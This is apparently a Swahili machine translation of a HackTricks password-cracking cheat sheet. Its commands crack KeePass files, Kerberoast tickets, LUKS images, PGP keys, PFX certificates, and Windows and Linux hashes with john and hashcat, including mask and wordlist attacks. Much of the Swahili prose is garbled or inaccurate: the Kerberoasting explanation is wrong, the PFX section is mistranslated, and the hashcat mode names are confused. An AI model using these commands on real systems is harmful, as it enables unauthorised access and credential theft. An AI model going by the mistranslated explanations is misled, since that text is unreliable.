Keepass pia inatoa chaguo la kuzalisha nenosiri ngumu na salama kwa kutumia kigezo cha urefu na aina ya herufi zinazotumika. Hii inasaidia kuzuia mashambulizi ya nguvu ya kubashiri nenosiri. 

Ni muhimu kuhakikisha kuwa nenosiri la msingi (master password) ni ngumu na salama ili kuzuia upenyezaji wa nguvu. Pia, ni vyema kufanya nakala rudufu za faili ya Keepass ili kuhakikisha kuwa data haipotei ikiwa faili ya asili inapotea au kuharibiwa. 

Kwa ujumla, Keepass ni chombo muhimu katika usimamizi wa nenosiri na inaweza kusaidia kudumisha usalama wa data zako.
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Keberoasting ni mbinu ya kuvunja nywila ambayo inalenga kwenye kuvunja nywila za akaunti za huduma ya Active Directory (AD) ambazo zinatumia kifaa cha kudhibiti upatikanaji wa AD. Mbinu hii inategemea udhaifu katika njia ambayo AD inashughulikia nywila za akaunti za huduma.

Kwa kawaida, nywila za akaunti za huduma ya AD zimehifadhiwa kwa kutumia fungu la hash ambalo linategemea algorithm ya RC4. Keberoasting inalenga kuchambua fungu hili la hash na kujaribu kuvunja nywila kwa kutumia mashambulizi ya nguvu ya kificho.

Mchakato wa keberoasting unahusisha hatua zifuatazo:

1. Kupata orodha ya akaunti za huduma ya AD ambazo zinatumia kifaa cha kudhibiti upatikanaji wa AD.
2. Kupata fungu la hash la nywila za akaunti hizo kutoka kwenye kifaa cha kudhibiti upatikanaji wa AD.
3. Kuchambua fungu la hash na kujaribu kuvunja nywila kwa kutumia mashambulizi ya nguvu ya kificho.

Keberoasting inaweza kuwa mbinu yenye ufanisi kwa wadukuzi kuvunja nywila za akaunti za huduma ya AD. Ni muhimu kwa watumiaji wa AD kuchukua hatua za kiusalama kama vile kuhakikisha nywila zao ni ngumu na kuzibadilisha mara kwa mara ili kuzuia mashambulizi ya keberoasting.
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Picha ya Lucks

#### Njia ya 1

Sakinisha: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Njia ya 2

##### Brute Force

##### Kuvunja nguvu

Brute force is a common method used in hacking to gain unauthorized access to a system or account. It involves systematically trying all possible combinations of passwords until the correct one is found.

Kuvunja nguvu ni njia ya kawaida inayotumiwa katika udukuzi ili kupata ufikiaji usio halali kwa mfumo au akaunti. Inahusisha kujaribu kwa mpangilio wa kimfumo mchanganyiko wote wa nywila hadi ile sahihi ipatikane.

This method can be time-consuming and resource-intensive, especially if the password is long and complex. However, it can be effective if the password is weak or easily guessable.

Njia hii inaweza kuchukua muda mrefu na kutumia rasilimali nyingi, hasa ikiwa nywila ni ndefu na ngumu. Walakini, inaweza kuwa na ufanisi ikiwa nywila ni dhaifu au rahisi kudhani.

To perform a brute force attack, hackers use automated tools that systematically generate and test different password combinations. These tools can be customized to target specific systems or accounts.

Kutekeleza shambulio la kuvunja nguvu, wadukuzi hutumia zana za otomatiki ambazo huzalisha na kujaribu mchanganyiko tofauti wa nywila. Zana hizi zinaweza kubadilishwa kulingana na mfumo au akaunti maalum inayolengwa.

It is important to note that brute force attacks are illegal and unethical unless performed with proper authorization for legitimate security testing purposes.

Ni muhimu kuelewa kuwa mashambulio ya kuvunja nguvu ni kinyume cha sheria na hayana maadili isipokuwa yamefanywa kwa idhini sahihi kwa madhumuni halali ya upimaji wa usalama.
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
Mwongozo mwingine wa Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### Funguo Binafsi za PGP/GPG

Funguo binafsi za PGP/GPG ni sehemu muhimu ya mfumo wa usalama wa PGP/GPG. Funguo hizi hutumiwa kwa kusaini na kusimbua ujumbe kwa njia ya siri. Kwa kawaida, funguo binafsi huhifadhiwa kwenye faili maalum na kulindwa kwa nywila ili kuzuia ufikiaji usioidhinishwa.

Kwa kufanya shambulio la nguvu, unaweza kujaribu kubaini funguo binafsi za PGP/GPG kwa kujaribu nywila tofauti kwa kila funguo. Shambulio hili linaweza kufanywa kwa kutumia programu maalum za kubaini nywila au kwa kutumia skrini ya amri.

Kuna njia kadhaa za kuboresha ufanisi wa shambulio la nguvu. Moja ya njia hizo ni kutumia orodha ya nywila maarufu au nywila zilizovuja kutoka kwa vyanzo vingine. Pia, unaweza kujaribu kutumia teknolojia ya GPU au kusambaza shambulio kwenye vifaa vingi ili kuongeza kasi ya mchakato.

Ni muhimu kukumbuka kuwa shambulio la nguvu linaweza kuchukua muda mrefu sana, hasa ikiwa nywila ni ngumu na ndefu. Kwa hiyo, ni muhimu kuwa na uvumilivu na kuwa na rasilimali za kutosha kwa shambulio hili.
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

Tumia [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) na kisha tumia john

### Open Office Pwd Protected Column

Ikiwa una faili ya xlsx na safu iliyolindwa kwa nenosiri unaweza kuiondoa:

* **Iipakie kwenye google drive** na nenosiri litafutwa kiotomatiki
* **Kuiondoa** **kwa mkono**:
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### Vyeti vya PFX

PFX ni aina ya faili ya cheti inayotumiwa kwa usalama wa mawasiliano ya mtandao. Inajumuisha ufunguo wa umma na ufunguo wa faragha, ambayo inaruhusu kudhibitisha utambulisho na kusimbua data. Vyeti vya PFX mara nyingi hutumiwa katika mazingira ya kubadilishana data kwa njia salama, kama vile kusaini na kusimbua barua pepe au kuanzisha uhusiano salama kwa njia ya HTTPS.

Kwa kawaida, vyeti vya PFX huwa na nywila ili kulinda ufunguo wa faragha. Wakati wa kufanya shambulio la kubadilishana data, mbinu ya kawaida ni kujaribu kubadilisha nywila kwa kutumia nguvu ya brute. Hii inahusisha kujaribu nywila zote zinazowezekana mpaka nywila sahihi ipatikane.

Kuna zana nyingi zinazopatikana kwa ajili ya kutekeleza shambulio la kubadilisha data kwenye vyeti vya PFX. Zana hizi zinaweza kufanya majaribio ya kubadilisha nywila kwa kasi kubwa, ikirahisisha mchakato wa kuvunja ulinzi wa cheti.

Ni muhimu kutambua kuwa kubadilisha nywila za vyeti vya PFX bila idhini inaweza kuwa kinyume cha sheria na kukiuka faragha na usalama wa mawasiliano. Kwa hivyo, matumizi ya mbinu hii inapaswa kufanywa tu kwa madhumuni ya kujifunza na kwa idhini ya wamiliki wa vyeti husika.
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia taratibu za kiotomatiki** zinazotumia zana za jamii zilizo **za juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Zana

**Mifano ya Hash:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Kitambulisho cha Hash
```bash
hash-identifier
> <HASH>
```
### Orodha za Maneno

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Zana za Kuzalisha Orodha za Maneno**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Jenereta ya kipekee ya herufi za keyboard yenye uwezo wa kubadilishwa kwa kutumia herufi za msingi, ramani ya herufi na njia.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### Mabadiliko ya John

Soma _**/etc/john/john.conf**_ na ukifanye mabadiliko yake.
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Mashambulizi ya Hashcat

* **Mashambulizi ya orodha ya maneno** (`-a 0`) na sheria

**Hashcat** tayari inakuja na **folda inayojumuisha sheria** lakini unaweza kupata [**sheria nyingine za kuvutia hapa**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Shambulio la Uchanganuzi wa Orodha ya Maneno**

Inawezekana **kuunganisha orodha 2 za maneno kuwa moja** kwa kutumia hashcat.\
Ikiwa orodha ya kwanza ina neno **"hello"** na ya pili ina mistari 2 yenye maneno **"world"** na **"earth"**. Maneno `helloworld` na `helloearth` yatazalishwa.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Shambulio la Kuficha** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Shida ya Orodha ya Maneno + Kinyago (`-a 6`) / Kinyago + Orodha ya Maneno (`-a 7`)
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Njia za Hashcat

Hashcat ina njia tofauti za kushambulia nywila. Hapa kuna maelezo ya njia kadhaa muhimu:

- **Njia ya Nenosiri Moja (Single Hash Mode)**: Njia hii inatumika kwa kushambulia nenosiri moja kwa wakati mmoja. Hashcat itajaribu kila nenosiri linalowezekana hadi itapata mechi na hash iliyotolewa.

- **Njia ya Nenosiri Nyingi (Multiple Hash Mode)**: Njia hii inaruhusu kushambulia nywila nyingi kwa wakati mmoja. Hashcat itatumia orodha ya nywila au faili ya nywila iliyotolewa na kujaribu kila nywila dhidi ya hash zilizotolewa.

- **Njia ya Nenosiri la Jumla (Brute-Force Mode)**: Njia hii inaruhusu kushambulia nywila kwa kujaribu kila kombinasi ya herufi, nambari, na alama. Hashcat itaanza na nywila fupi na kuendelea kuongeza urefu wa nywila hadi itapata mechi na hash iliyotolewa.

- **Njia ya Nenosiri la Jumla la Neno (Hybrid Wordlist + Mask Mode)**: Njia hii inaruhusu kuchanganya orodha ya nywila na mabadiliko ya herufi, nambari, na alama kwa kutumia mask. Hashcat itatumia orodha ya nywila iliyotolewa na kufanya mabadiliko kulingana na mask iliyotolewa.

- **Njia ya Nenosiri la Jumla la Namba (Hybrid Mask + Wordlist Mode)**: Njia hii inafanya kazi sawa na njia ya "Nenosiri la Jumla la Neno", lakini inatumia mask kwanza na kisha orodha ya nywila.

- **Njia ya Nenosiri la Jumla la Namba na Neno (Hybrid Mask + Wordlist + Mask Mode)**: Njia hii inaruhusu kuchanganya mask na orodha ya nywila, na kisha kufanya mabadiliko mengine kulingana na mask ya pili iliyotolewa.

- **Njia ya Nenosiri la Jumla la Namba na Neno (Combinator Attack Mode)**: Njia hii inaruhusu kuchanganya nywila kutoka kwa orodha mbili tofauti na kujaribu kila kombinasi. Hashcat itaunda nywila mpya kwa kuchanganya nywila kutoka orodha zote mbili na kujaribu kila moja dhidi ya hash iliyotolewa.

- **Njia ya Nenosiri la Jumla la Namba na Neno (Rule-Based Attack Mode)**: Njia hii inaruhusu kutumia sheria za kawaida za kubadilisha nywila. Hashcat itatumia orodha ya nywila iliyotolewa na kuzingatia sheria zilizotolewa ili kujaribu kila nywila iliyobadilishwa dhidi ya hash iliyotolewa.
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# Kuvunja Hash za Linux - Faili ya /etc/shadow

Kuvunja hash za Linux ni mbinu inayotumiwa na wadukuzi kujaribu kuvunja nywila zilizohifadhiwa katika faili ya `/etc/shadow` kwenye mfumo wa Linux. Faili hii ina habari muhimu kuhusu watumiaji wa mfumo, pamoja na hash za nywila zao.

Kuna njia kadhaa za kuvunja hash za Linux, mojawapo ikiwa ni kwa kutumia mbinu ya "brute force". Mbinu hii inahusisha kujaribu kila kombinasi iwezekanavyo ya nywila hadi kupata ile sahihi. Hii inaweza kufanyika kwa kutumia programu maalum za kuvunja nywila kama vile John the Ripper au Hashcat.

Kabla ya kuanza kuvunja hash za Linux, ni muhimu kuelewa kuwa mbinu hii ni kinyume cha sheria ikiwa hufanyiki kwenye mfumo ambao haujakupatia idhini ya kufanya hivyo. Kwa hiyo, ni muhimu kufanya kazi hii tu kwenye mifumo ambayo umepewa idhini ya kufanya majaribio ya kuvunja nywila.

Kwa kawaida, faili ya `/etc/shadow` inalindwa na mifumo ya usalama ya Linux, kama vile kuzuia upatikanaji wa faili hiyo kwa watumiaji wasio na mamlaka. Hii inafanya iwe ngumu kwa wadukuzi kupata hash za nywila. Hata hivyo, ikiwa wadukuzi wanaweza kupata ufikiaji wa faili hiyo, wanaweza kuanza mchakato wa kuvunja hash.

Mbinu ya "brute force" inahitaji muda mrefu na rasilimali nyingi za kompyuta. Kwa hiyo, wadukuzi mara nyingi hutumia mbinu zingine kama vile kutumia orodha ya maneno maarufu au kutumia teknolojia ya GPU kuharakisha mchakato wa kuvunja hash.

Ni muhimu kwa watumiaji wa Linux kuchukua hatua za usalama ili kuzuia kuvunjwa kwa hash za nywila zao. Hatua hizi ni pamoja na kutumia nywila zenye nguvu, kubadilisha nywila mara kwa mara, na kutumia mifumo ya kufuatilia na kuzuia majaribio ya kuvunja nywila.

Kwa ufupi, kuvunja hash za Linux ni mchakato wa kujaribu kuvunja nywila zilizohifadhiwa katika faili ya `/etc/shadow` kwa kutumia mbinu ya "brute force" au mbinu zingine. Ni muhimu kuelewa kuwa kufanya hivyo bila idhini ni kinyume cha sheria, na watumiaji wa Linux wanapaswa kuchukua hatua za usalama ili kuzuia kuvunjwa kwa nywila zao.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# Kuvunja Hash za Windows

Kuvunja hash za Windows ni mchakato wa kugundua nywila zilizofichwa kwenye mfumo wa Windows kwa kutumia njia ya nguvu. Kuna njia kadhaa za kufanya hivyo, ikiwa ni pamoja na kutumia programu za kuvunja hash, kama vile John the Ripper au Hashcat.

## Kutumia John the Ripper

John the Ripper ni chombo cha kuvunja hash kinachojulikana sana ambacho kinaweza kutumika kuvunja hash za Windows. Hapa kuna hatua za kufuata:

1. Tafuta faili ya hash ya Windows. Faili hii inaweza kuwa `SAM` au `NTDS.dit` kwenye mfumo wa Windows.

2. Tumia John the Ripper kusoma faili ya hash na kuanza mchakato wa kuvunja. Unaweza kutumia amri kama ifuatavyo:

   ```
   john --format=NT --wordlist=/path/to/wordlist.txt /path/to/hashfile
   ```

   Ambapo `/path/to/wordlist.txt` ni njia ya faili ya orodha ya maneno na `/path/to/hashfile` ni njia ya faili ya hash.

3. Subiri John the Ripper kukamilisha mchakato wa kuvunja. Inaweza kuchukua muda mrefu kulingana na ukubwa wa faili ya hash na nguvu ya kompyuta yako.

4. Mara tu John the Ripper anapokamilisha, utapata nywila zilizovunjwa zimeorodheshwa kwenye kikao cha terminal.

## Kutumia Hashcat

Hashcat ni chombo kingine cha kuvunja hash kinachojulikana ambacho kinaweza kutumika kuvunja hash za Windows. Hapa kuna hatua za kufuata:

1. Tafuta faili ya hash ya Windows kama ilivyoelezwa hapo juu.

2. Tumia Hashcat kusoma faili ya hash na kuanza mchakato wa kuvunja. Unaweza kutumia amri kama ifuatavyo:

   ```
   hashcat -m 1000 -a 0 /path/to/hashfile /path/to/wordlist.txt
   ```

   Ambapo `/path/to/hashfile` ni njia ya faili ya hash na `/path/to/wordlist.txt` ni njia ya faili ya orodha ya maneno.

3. Subiri Hashcat kukamilisha mchakato wa kuvunja. Kama ilivyo na John the Ripper, inaweza kuchukua muda mrefu kulingana na ukubwa wa faili ya hash na nguvu ya kompyuta yako.

4. Mara tu Hashcat inapokamilisha, utapata nywila zilizovunjwa zimeorodheshwa kwenye kikao cha terminal.

Kumbuka: Kuvunja hash za Windows bila idhini inaweza kuwa kinyume cha sheria. Hakikisha unazingatia sheria na kanuni zinazohusiana na uhalifu wa mtandao katika eneo lako.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
# Kuvunja Hashes za Maombi Maarufu

Kuna njia kadhaa za kuvunja hashes za maombi maarufu. Hapa chini nimeorodhesha njia tatu za kawaida:

## 1. Brute Force

Njia hii inahusisha kujaribu kila uwezekano wa neno la siri hadi kupata mechi na hash iliyotolewa. Kuna zana nyingi za kufanya hivyo, kama vile John the Ripper na Hashcat. Unaweza pia kutumia orodha ya maneno maarufu au orodha ya maneno ya kawaida kama msingi wa jaribio lako.

## 2. Dictionary Attack

Njia hii inahusisha kutumia orodha ya maneno iliyoundwa tayari (inayojulikana kama dictionary) kujaribu kila neno katika orodha hiyo kama neno la siri. Zana kama John the Ripper na Hashcat pia zinaweza kutumika kutekeleza mashambulizi ya kamusi.

## 3. Rainbow Table Attack

Njia hii inahusisha kutumia meza ya upinde wa mvua, ambayo ni orodha ya mapendekezo ya hash na maadili yanayolingana ya neno la siri. Kwa kulinganisha hash iliyotolewa na meza ya upinde wa mvua, unaweza kupata neno la siri linalolingana. Zana kama RainbowCrack zinaweza kutumika kutekeleza mashambulizi ya meza ya upinde wa mvua.

Ni muhimu kutambua kuwa kuvunja hashes za maombi ni kinyume cha sheria isipokuwa unaruhusiwa kufanya hivyo kwa madhumuni ya kujaribu usalama wa mfumo wako au kwa idhini ya mmiliki wa mfumo.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kuautomatisha mchakato** wa kazi kwa kutumia zana za jamii **zilizoendelea zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
